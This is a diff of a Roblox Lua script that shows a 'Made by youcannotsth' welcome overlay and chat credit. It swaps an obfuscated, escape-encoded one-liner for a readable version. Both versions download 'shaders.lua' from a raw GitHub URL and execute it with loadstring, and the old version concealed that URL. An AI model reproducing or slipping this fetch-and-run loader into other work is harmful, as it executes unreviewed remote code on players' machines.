@@ -1,1 +1,71 @@
-local v=game:GetService("\080\108\097\121\101\114\115")local O=game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101")local H=game:GetService("\083\116\097\114\116\101\114\071\117\105")local S=v.LocalPlayer local f=Instance.new("\083\099\114\101\101\110\071\117\105",S:WaitForChild("\080\108\097\121\101\114\071\117\105"))f.Name="\087\101\108\099\111\109\101\079\118\101\114\108\097\121"f.IgnoreGuiInset=true f.ResetOnSpawn=false local Y=Instance.new("\070\114\097\109\101",f)Y.Size=UDim2.new(1,0,1,0)Y.Position=UDim2.new(0,0,0,0)Y.BackgroundColor3=Color3.fromRGB(20,20,20)local u=Instance.new("\085\073\067\111\114\110\101\114",Y)u.CornerRadius=UDim.new(0,0)local R=Instance.new("\084\101\120\116\076\097\098\101\108",Y)R.Size=UDim2.new(1,-40,0,80)R.Position=UDim2.new(.5,0,.5,0)R.AnchorPoint=Vector2.new(.5,.5)R.BackgroundTransparency=1 R.TextColor3=Color3.fromRGB(255,255,255)R.Font=Enum.Font.GothamBold R.TextScaled=true R.Text=""local l="\077\097\100\101 \098\121 \121\111\117\099\097\110\110\111\116\115\116\104"local g=4;(coroutine.wrap(function()for v=1,#l,1 do R.Text=string.sub(l,1,v)wait(1/g)end wait(1.5);(O:Create(Y,TweenInfo.new(.5),{BackgroundTransparency=1})):Play();(O:Create(R,TweenInfo.new(.5),{TextTransparency=1})):Play()wait(.6)f:Destroy()end))();(coroutine.wrap(function()pcall(function()(loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\074\101\099\107\065\115\067\104\114\105\115\116\111\112\104\101\114\047\104\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\115\104\097\100\101\114\115\046\108\117\097")))()end)end))()game.StarterGui:SetCore("\067\104\097\116\077\097\107\101\083\121\115\116\101\109\077\101\115\115\097\103\101",{Text="\077\097\100\101 \098\121 \121\111\117\099\097\110\110\111\116\115\116\104";Color=Color3.fromRGB(255,200,255),Font=Enum.Font.GothamBold;TextSi
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local StarterGui = game:GetService("StarterGui")
+
+local player = Players.LocalPlayer
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "WelcomeOverlay"
+gui.IgnoreGuiInset = true
+gui.ResetOnSpawn = false
+
+-- Fullscreen background
+local bg = Instance.new("Frame", gui)
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.Position = UDim2.new(0, 0, 0, 0)
+bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+
+local uiCorner = Instance.new("UICorner", bg)
+uiCorner.CornerRadius = UDim.new(0, 0)
+
+-- Typing label
+local label = Instance.new("TextLabel", bg)
+label.Size = UDim2.new(1, -40, 0, 80)
+label.Position = UDim2.new(0.5, 0, 0.5, 0)
+label.AnchorPoint = Vector2.new(0.5, 0.5)
+label.BackgroundTransparency = 1
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.Font = Enum.Font.GothamBold
+label.TextScaled = true
+label.Text = ""
+
+-- Typing animation
+local fullText = "Made by youcannotsth"
+local typeSpeed = 4
+
+task.spawn(function()
+	for i = 1, #fullText do
+		label.Text = string.sub(fullText, 1, i)
+		task.wait(1 / typeSpeed)
+	end
+
+	task.wait(1.5)
+
+	local tweenOutBG = TweenService:Create(bg, TweenInfo.new(0.5), {BackgroundTransparency = 1})
+	local tweenOutLabel = TweenService:Create(label, TweenInfo.new(0.5), {TextTransparency = 1})
+
+	tweenOutBG:Play()
+	tweenOutLabel:Play()
+	tweenOutBG.Completed:Wait() -- Wait for animation to finish
+
+	gui:Destroy()
+
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/JeckAsChristopher/h/main/shaders.lua"))()
+	end)
+
+	local TextChatService = game:GetService("TextChatService")
+local systemChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXSystem")
+
+systemChannel:DisplaySystemMessage(
+  "<font color='#FFC8FF' face='SourceSansBold' size='20'>Made by youcannotsth</font>"
+    )
+
+	-- Optional error notification
+	if not success then
+		StarterGui:SetCore("SendNotification", {
+			Title = "Shader Load Failed",
+			Text = tostring(err),
+			Duration = 5
+		})
+	end
+end)
